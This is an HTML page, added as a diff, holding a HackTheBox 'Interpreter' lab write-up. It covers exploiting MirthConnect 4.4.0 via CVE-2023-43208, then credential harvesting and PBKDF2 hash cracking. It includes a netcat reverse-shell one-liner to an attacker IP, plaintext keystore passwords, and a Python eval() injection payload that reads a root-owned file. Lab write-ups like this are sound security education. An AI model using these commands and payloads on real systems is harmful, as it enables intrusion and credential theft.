@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>HTB-Interpreter | the008Ki11er</title>
+<meta name="keywords" content="">
+<meta name="description" content="This machine involves exploiting a known vulnerability in MirthConnect 4.4.0 to gain an initial foothold, cracking a PBKDF2-HMAC-SHA256 hash to escalate to a real user, and finally abusing an insecure `eval()` call in a locally running Flask service to read the root flag.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/writeups/hackthebox/interpreter/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.f0aeecef0c6bef020a9d5f83f42698478ee2a6e72d20fa4a1c2514cd7de8a85c.css" integrity="sha256-8K7s7wxr7wIKnV&#43;D9CaYR47ipuctIPpKHCUUzX3oqFw=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/hackthebox/interpreter/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/writeups/hackthebox/interpreter/">
+  <meta property="og:site_name" content="the008Ki11er">
+  <meta property="og:title" content="HTB-Interpreter">
+  <meta property="og:description" content="This machine involves exploiting a known vulnerability in MirthConnect 4.4.0 to gain an initial foothold, cracking a PBKDF2-HMAC-SHA256 hash to escalate to a real user, and finally abusing an insecure `eval()` call in a locally running Flask service to read the root flag.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2026-05-30T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-05-30T00:00:00+00:00">
+    <meta property="og:image" content="http://localhost:1313/writeups/hackthebox/interpreter/writeups/HacktheBox/interpreter-cover.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://localhost:1313/writeups/hackthebox/interpreter/writeups/HacktheBox/interpreter-cover.png">
+<meta name="twitter:title" content="HTB-Interpreter">
+<meta name="twitter:description" content="This machine involves exploiting a known vulnerability in MirthConnect 4.4.0 to gain an initial foothold, cracking a PBKDF2-HMAC-SHA256 hash to escalate to a real user, and finally abusing an insecure `eval()` call in a locally running Flask service to read the root flag.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "http://localhost:1313/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "HackTheBox",
+      "item": "http://localhost:1313/writeups/hackthebox/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "HTB-Interpreter",
+      "item": "http://localhost:1313/writeups/hackthebox/interpreter/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB-Interpreter",
+  "name": "HTB-Interpreter",
+  "description": "This machine involves exploiting a known vulnerability in MirthConnect 4.4.0 to gain an initial foothold, cracking a PBKDF2-HMAC-SHA256 hash to escalate to a real user, and finally abusing an insecure `eval()` call in a locally running Flask service to read the root flag.",
+  "keywords": [
+    
+  ],
+  "articleBody": "Overview Category\rInfo\rMachine NameInterpreter\rDifficultyMedium\rRelease Date21 February, 2026\rAuthorReziT\rOSLinux\rPwned Date23 February, 2026\rEnumeration Port Scan Initial enumeration revealed the following open ports:\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0) | ssh-hostkey: | 256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA) |_ 256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519) 80/tcp open http Jetty |_http-title: Mirth Connect Administrator | http-methods: |_ Potentially risky methods: TRACE 443/tcp open ssl/http Jetty |_http-title: Mirth Connect Administrator | http-methods: |_ Potentially risky methods: TRACE | ssl-cert: Subject: commonName=mirth-connect | Not valid before: 2025-09-19T12:50:05 |_Not valid after: 2075-09-19T12:50:05 |_ssl-date: TLS randomness does not represent time 6661/tcp open unknown Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel The two localhost-only ports stood out immediately as targets for SSH tunneling after gaining a foothold.\nMirthConnect Visiting the web interface revealed a webstat.jnpl file exposing the version: MirthConnect 4.4.0.\nInitial Foothold: CVE-2023-43208 MirthConnect 4.4.0 is vulnerable to CVE-2023-43208, an unauthenticated Remote Code Execution vulnerability.\nUse this command on the terminal after RCE works and setup listener on another terminal to get interactive shell:\nrm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2\u003e\u00261 | nc 10.10.14.11 5555 \u003e /tmp/f Credential Harvesting Database Credentials The MirthConnect configuration file at /usr/local/mirthconnect/conf/mirth.properties contained plaintext credentials:\ndatabase.username = mirthdb database.password = keystore.path = ${dir.appdata}/keystore.jks keystore.storepass = 5GbU5HGTOOgE keystore.keypass = tAuJfQeXdnPw keystore.type = JCEKS PBKDF2 Hash Cracking The following hash string was discovered for user sedric:\nmysql -u mirthdb -p -e \"USE mc_bdd_prod; SELECT p.USERNAME, pp.PASSWORD FROM PERSON p JOIN PERSON_PASSWORD pp ON p.ID = pp.PERSON_ID;\" USERNAME PASSWORD sedric u/+LB This is a PBKDF2-HMAC-SHA256 hash. To convert it into hashcat format, the following steps were performed in CyberChef:\nFrom Base64 — decode the hash value To Hex — convert to hex representation Take first 8 bytes — convert from hex → base64, this is the salt Take remaining bytes — convert from hex → base64, this is the hash This produced the hashcat-compatible format:\nsha256:600000:: Cracking with hashcat:\nhashcat -m 10900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt Get the flag after gaining secure shell using SSH\nPrivilege Escalation Discovery Running ss -tulnp after SSH access confirmed the earlier localhost port of interest 127.0.0.1:54321. These ports are explained as following for the service they are running:\nPublicly Accessible Services (0.0.0.0:*) and Restricted Local Services (127.0.0.1:*)\n0.0.0.0:22: SSH port 0.0.0.0:80: HTTP Web-Server 0.0.0.0:443: HTTPS Server 0.0.0.0:4444: netcat shell we are running 0.0.0.0:6661: MirthConnect CLI 127.0.0.1:3306: Mysql server 127.0.0.1:54321: Some internal service 127.0.0.1:54321 is a restricted local service so we use SSH tunneling:\nssh -L 54321:127.0.0.1:54321 sedric@interpreter.htb We see the processes running on the box using ps aux Code Analysis The service accepts XML patient data via POST /addPatient and formats it using a templating function. The critical flaw is in this block:\ntemplate = f\"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}\" try: return eval(f\"f'''{template}'''\") User-controlled fields are interpolated into a string that is then evaluated as an f-string via eval(). This means anything inside {} in an input field is executed as Python code.\nThe regex filter attempts to block dangerous characters:\npattern = re.compile(r\"^[a-zA-Z0-9._'\\\"(){}=+/]+$\") However it permits {}, ., (), _, ', and \" — more than enough to achieve code execution using Python built-ins.\nExploitation Since curl was not available on the box, a Python script was crafted and run directly:\nimport requests xml_payload = \"\"\" John cena {__import__('builtins').open('/root/root.txt').read()} 12/12/2024 01/01/1990 M \"\"\" r = requests.post( \"http://127.0.0.1:54321/addPatient\", headers={\"Content-Type\": \"application/xml\"}, data=xml_payload ) print(r.status_code) print(r.text) The sender_app field injects {__import__('builtins').open('/root/root.txt').read()} into the eval’d f-string. Since the service runs as root, this directly reads the root flag.\nKey Takeaways CVE-2023-43208: MirthConnect 4.4.0 is affected by unauthenticated RCE. Always check service versions during enumeration. PBKDF2 hashes: Can be cracked with hashcat mode 10900. The salt/hash split must be done manually when the format is non-standard. eval() on user input is never safe: even with regex filtering. Whitelisting characters like {}, (), and . is insufficient when the target is a Python expression evaluator. References CVE-2023-43208: https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT/tree/main PBKDF2-HMAC-SHA256 hash: https://github.com/nextgenhealthcare/connect/issues/5665 Write-up prepared by: the008killer\n",
+  "wordCount" : "670",
+  "inLanguage": "en",
+  "image":"http://localhost:1313/writeups/hackthebox/interpreter/writeups/HacktheBox/interpreter-cover.png","datePublished": "2026-05-30T00:00:00Z",
+  "dateModified": "2026-05-30T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/writeups/hackthebox/interpreter/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "the008Ki11er",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header sticky-header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="the008Ki11er (Alt + H)">the008Ki11er</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <ul class="lang-switch"><li>|</li>
+                </ul>
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/about" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/writeups" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/projects" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/experience" title="Experience">
+                    <span>Experience</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/">Writeups</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/hackthebox/">HackTheBox</a></div>
+    <h1 class="post-title entry-hint-parent">
+      HTB-Interpreter
+    </h1>
+    <div class="post-description">
+      This machine involves exploiting a known vulnerability in MirthConnect 4.4.0 to gain an initial foothold, cracking a PBKDF2-HMAC-SHA256 hash to escalate to a real user, and finally abusing an insecure `eval()` call in a locally running Flask service to read the root flag.
+    </div>
+  </header> 
+<figure class="entry-cover">
+        <img loading="eager" src="http://localhost:1313/writeups/HacktheBox/interpreter-cover.png" alt="HTB Interpreter cover image">
+        
+</figure><div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">‎ Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#overview" aria-label="Overview">Overview</a></li>
+                <li>
+                    <a href="#enumeration" aria-label="Enumeration">Enumeration</a><ul>
+                        
+                <li>
+                    <a href="#port-scan" aria-label="Port Scan">Port Scan</a></li>
+                <li>
+                    <a href="#mirthconnect" aria-label="MirthConnect">MirthConnect</a></li></ul>
+                </li>
+                <li>
+                    <a href="#webstatjnlp" aria-label=""></a></li>
+                <li>
+                    <a href="#initial-foothold-cve-2023-43208" aria-label="Initial Foothold: CVE-2023-43208">Initial Foothold: CVE-2023-43208</a></li>
+                <li>
+                    <a href="#credential-harvesting" aria-label="Credential Harvesting">Credential Harvesting</a><ul>
+                        
+                <li>
+                    <a href="#database-credentials" aria-label="Database Credentials">Database Credentials</a></li>
+                <li>
+                    <a href="#pbkdf2-hash-cracking" aria-label="PBKDF2 Hash Cracking">PBKDF2 Hash Cracking</a></li></ul>
+                </li>
+                <li>
+                    <a href="#privilege-escalation" aria-label="Privilege Escalation">Privilege Escalation</a><ul>
+                        
+                <li>
+                    <a href="#discovery" aria-label="Discovery">Discovery</a></li>
+                <li>
+                    <a href="#code-analysis" aria-label="Code Analysis">Code Analysis</a></li>
+                <li>
+                    <a href="#exploitation" aria-label="Exploitation">Exploitation</a></li></ul>
+                </li>
+                <li>
+                    <a href="#key-takeaways" aria-label="Key Takeaways">Key Takeaways</a></li>
+                <li>
+                    <a href="#references" aria-label="References">References</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
+<table style="width:100%; table-layout:fixed;">
+  <thead>
+    <tr>
+      <th style="width:40%; text-align:left;">Category</th>
+      <th style="width:60%; text-align:left;">Info</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr><td>Machine Name</td><td>Interpreter</td></tr>
+    <tr><td>Difficulty</td><td>Medium</td></tr>
+    <tr><td>Release Date</td><td>21 February, 2026</td></tr>
+    <tr><td>Author</td><td>ReziT</td></tr>
+    <tr><td>OS</td><td>Linux</td></tr>
+    <tr><td>Pwned Date</td><td>23 February, 2026</td></tr>
+  </tbody>
+</table>
+<hr>
+<h2 id="enumeration">Enumeration<a hidden class="anchor" aria-hidden="true" href="#enumeration">#</a></h2>
+<h3 id="port-scan">Port Scan<a hidden class="anchor" aria-hidden="true" href="#port-scan">#</a></h3>
+<p>Initial enumeration revealed the following open ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT     STATE SERVICE  VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp   open  http     Jetty
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Mirth Connect Administrator
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl">443/tcp  open  ssl/http Jetty
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Mirth Connect Administrator
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>mirth-connect
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-09-19T12:50:05
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2075-09-19T12:50:05
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl">6661/tcp open  unknown
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>The two localhost-only ports stood out immediately as targets for SSH tunneling after gaining a foothold.</p>
+<h3 id="mirthconnect">MirthConnect<a hidden class="anchor" aria-hidden="true" href="#mirthconnect">#</a></h3>
+<p>Visiting the web interface revealed a <code>webstat.jnpl</code> file exposing the version: <strong>MirthConnect 4.4.0</strong>.</p>
+<p><img alt="Web homepage" loading="lazy" src="/writeups/hackthebox/interpreter/assets/homepage.png"></p>
+<h2 id="webstatjnlp"><img alt="Webstat.jnlp" loading="lazy" src="/writeups/hackthebox/interpreter/assets/jnlp.png"><a hidden class="anchor" aria-hidden="true" href="#webstatjnlp">#</a></h2>
+<h2 id="initial-foothold-cve-2023-43208">Initial Foothold: CVE-2023-43208<a hidden class="anchor" aria-hidden="true" href="#initial-foothold-cve-2023-43208">#</a></h2>
+<p>MirthConnect 4.4.0 is vulnerable to <a href="https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT/tree/main"><strong>CVE-2023-43208</strong></a>, an unauthenticated Remote Code Execution vulnerability.</p>
+<p><img alt="Foothold, rce" loading="lazy" src="/writeups/hackthebox/interpreter/assets/foothold.png"></p>
+<p>Use this command on the terminal after RCE works and setup listener on another terminal to get interactive shell:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rm /tmp/f<span class="p">;</span> mkfifo /tmp/f<span class="p">;</span> cat /tmp/f <span class="p">|</span> /bin/bash -i 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> nc 10.10.14.11 <span class="m">5555</span> &gt; /tmp/f
+</span></span></code></pre></div><hr>
+<h2 id="credential-harvesting">Credential Harvesting<a hidden class="anchor" aria-hidden="true" href="#credential-harvesting">#</a></h2>
+<h3 id="database-credentials">Database Credentials<a hidden class="anchor" aria-hidden="true" href="#database-credentials">#</a></h3>
+<p>The MirthConnect configuration file at <code>/usr/local/mirthconnect/conf/mirth.properties</code> contained plaintext credentials:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">database.username <span class="o">=</span> mirthdb
+</span></span><span class="line"><span class="cl">database.password <span class="o">=</span> &lt;REDACTED&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">keystore.path     <span class="o">=</span> <span class="si">${</span><span class="nv">dir</span><span class="p">.appdata</span><span class="si">}</span>/keystore.jks
+</span></span><span class="line"><span class="cl">keystore.storepass <span class="o">=</span> 5GbU5HGTOOgE
+</span></span><span class="line"><span class="cl">keystore.keypass   <span class="o">=</span> tAuJfQeXdnPw
+</span></span><span class="line"><span class="cl">keystore.type      <span class="o">=</span> JCEKS
+</span></span></code></pre></div><h3 id="pbkdf2-hash-cracking">PBKDF2 Hash Cracking<a hidden class="anchor" aria-hidden="true" href="#pbkdf2-hash-cracking">#</a></h3>
+<p>The following hash string was discovered for user <code>sedric</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql -u mirthdb -p&lt;PASS&gt; -e <span class="s2">&#34;USE mc_bdd_prod; SELECT p.USERNAME, pp.PASSWORD FROM PERSON p JOIN PERSON_PASSWORD pp ON p.ID = pp.PERSON_ID;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">USERNAME        PASSWORD
+</span></span><span class="line"><span class="cl">sedric  u/+LB&lt;REDACTED&gt;
+</span></span></code></pre></div><p>This is a <a href="https://github.com/nextgenhealthcare/connect/issues/5665"><strong>PBKDF2-HMAC-SHA256</strong></a> hash. To convert it into hashcat format, the following steps were performed in CyberChef:</p>
+<ol>
+<li><strong>From Base64</strong> — decode the hash value</li>
+<li><strong>To Hex</strong> — convert to hex representation</li>
+<li><strong>Take first 8 bytes</strong> — convert from hex → base64, this is the <strong>salt</strong></li>
+<li><strong>Take remaining bytes</strong> — convert from hex → base64, this is the <strong>hash</strong></li>
+</ol>
+<p>This produced the hashcat-compatible format:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sha256:600000:&lt;SALT&gt;:&lt;ENCRYPTED HASH&gt;
+</span></span></code></pre></div><p>Cracking with hashcat:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat -m <span class="m">10900</span> -a <span class="m">0</span> hash.txt /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p><img alt="hashcrack" loading="lazy" src="/writeups/hackthebox/interpreter/assets/hashcat.png"></p>
+<p>Get the flag after gaining secure shell using SSH</p>
+<hr>
+<h2 id="privilege-escalation">Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h2>
+<h3 id="discovery">Discovery<a hidden class="anchor" aria-hidden="true" href="#discovery">#</a></h3>
+<p>Running <code>ss -tulnp</code> after SSH access confirmed the earlier localhost port of interest <code>127.0.0.1:54321</code>.
+<img alt="netstat" loading="lazy" src="/writeups/hackthebox/interpreter/assets/sstuln.png"></p>
+<p>These ports are explained as following for the service they are running:</p>
+<p>Publicly Accessible Services (<code>0.0.0.0:*</code>) and Restricted Local Services (<code>127.0.0.1:*</code>)</p>
+<ul>
+<li><code>0.0.0.0:22</code>: SSH port</li>
+<li><code>0.0.0.0:80</code>: HTTP Web-Server</li>
+<li><code>0.0.0.0:443</code>: HTTPS Server</li>
+<li><code>0.0.0.0:4444</code>: netcat shell we are running</li>
+<li><code>0.0.0.0:6661</code>: MirthConnect CLI</li>
+<li><code>127.0.0.1:3306</code>: Mysql server</li>
+<li><code>127.0.0.1:54321</code>: Some internal service</li>
+</ul>
+<p><code>127.0.0.1:54321</code> is a restricted local service so we use SSH tunneling:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -L 54321:127.0.0.1:54321 sedric@interpreter.htb
+</span></span></code></pre></div><p>We see the processes running on the box using <code>ps aux</code>
+<img alt="Processes and notif.py" loading="lazy" src="/writeups/hackthebox/interpreter/assets/psaux.png"></p>
+<h3 id="code-analysis">Code Analysis<a hidden class="anchor" aria-hidden="true" href="#code-analysis">#</a></h3>
+<p>The service accepts XML patient data via <code>POST /addPatient</code> and formats it using a templating function. The critical flaw is in this block:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">template</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;Patient </span><span class="si">{</span><span class="n">first</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">last</span><span class="si">}</span><span class="s2"> (</span><span class="si">{</span><span class="n">gender</span><span class="si">}</span><span class="s2">), </span><span class="se">{{</span><span class="s2">datetime.now().year - year_of_birth</span><span class="se">}}</span><span class="s2"> years old, received from </span><span class="si">{</span><span class="n">sender</span><span class="si">}</span><span class="s2"> at </span><span class="si">{</span><span class="n">ts</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">eval</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;f&#39;&#39;&#39;</span><span class="si">{</span><span class="n">template</span><span class="si">}</span><span class="s2">&#39;&#39;&#39;&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>User-controlled fields are interpolated into a string that is then <strong>evaluated as an f-string via <code>eval()</code></strong>. This means anything inside <code>{}</code> in an input field is executed as Python code.</p>
+<p>The regex filter attempts to block dangerous characters:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;^[a-zA-Z0-9._&#39;</span><span class="se">\&#34;</span><span class="s2">()</span><span class="si">{}</span><span class="s2">=+/]+$&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>However it permits <code>{}</code>, <code>.</code>, <code>()</code>, <code>_</code>, <code>'</code>, and <code>&quot;</code> — more than enough to achieve code execution using Python built-ins.</p>
+<h3 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h3>
+<p>Since <code>curl</code> was not available on the box, a Python script was crafted and run directly:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">xml_payload</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;&lt;patient&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  &lt;firstname&gt;John&lt;/firstname&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  &lt;lastname&gt;cena&lt;/lastname&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  &lt;sender_app&gt;{__import__(&#39;builtins&#39;).open(&#39;/root/root.txt&#39;).read()}&lt;/sender_app&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  &lt;timestamp&gt;12/12/2024&lt;/timestamp&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  &lt;birth_date&gt;01/01/1990&lt;/birth_date&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  &lt;gender&gt;M&lt;/gender&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/patient&gt;&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;http://127.0.0.1:54321/addPatient&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/xml&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="o">=</span><span class="n">xml_payload</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span></code></pre></div><p>The <code>sender_app</code> field injects <code>{__import__('builtins').open('/root/root.txt').read()}</code> into the eval&rsquo;d f-string. Since the service runs as root, this directly reads the root flag.</p>
+<p><img alt="Root" loading="lazy" src="/writeups/hackthebox/interpreter/assets/root.png"></p>
+<hr>
+<h2 id="key-takeaways">Key Takeaways<a hidden class="anchor" aria-hidden="true" href="#key-takeaways">#</a></h2>
+<ul>
+<li><strong>CVE-2023-43208</strong>: MirthConnect 4.4.0 is affected by unauthenticated RCE. Always check service versions during enumeration.</li>
